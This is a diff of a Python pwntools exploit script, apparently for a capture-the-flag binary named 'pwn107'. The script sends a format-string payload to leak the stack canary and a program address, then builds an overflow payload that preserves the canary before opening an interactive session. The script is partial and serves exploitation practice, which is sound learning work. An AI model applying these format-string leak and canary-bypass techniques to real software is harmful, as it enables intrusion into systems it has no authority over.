@@ -2,29 +2,35 @@
 from pwn import *
 from sys import argv
 
-#context.log_level = "debug"
-context.binary = binary = ELF('./pwn107-1644307530397.pwn107')
+context.log_level = "debug"
+context.binary = binary = ELF('./pwn107')
 
 
-p = process('./pwn107-1644307530397.pwn107')
+p = process('./pwn107')
 
-pid = util.proc.pidof(p)[0]
-util.proc.wait_for_debugger(pid)
 
-#p = remote('10.10.127.226', 9006)
-#gdb.attach(p)
-p.recvuntil(b"What's your last streak? ")
-p.sendline(b'%4$p')
+
+p.recvuntil(b'streak?')
+p.sendline(b'%13$p-%17$p')
+p.recv()
+resp = p.recv()
+resp = resp.split(b'\n')[1].split(b': ')[1].split(b"-")
+
+canary = str(resp[0]).replace('b', '').replace("'", '')
+elfAddress = str(resp[1]).replace('b', '').replace("'", '')
+
+print("[+] Canary address : ", canary)
+print("[+] ELF address : ", elfAddress)
+
+payload = b'A'*7
+payload += p64(int(canary, 16))
+payload += b"B"*8
+
+print(payload)
+
+p.sendline(payload)
+p.recv()
 recv = p.recv()
-
-recv = str(recv).split("\\n")[1]
-
-print(recv)
-
-leak = recv.split(': ')[1]
-leak = p64(int(leak, 16))
-pad = b'A'*203   #int(argv[1])
-
-p.sendline(pad+leak+b'BBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC')
-
-#p.interactive()
+print("Final ", recv)
+#  0xd9ab201b5a8c6400-0x555555400992
+p.interactive()
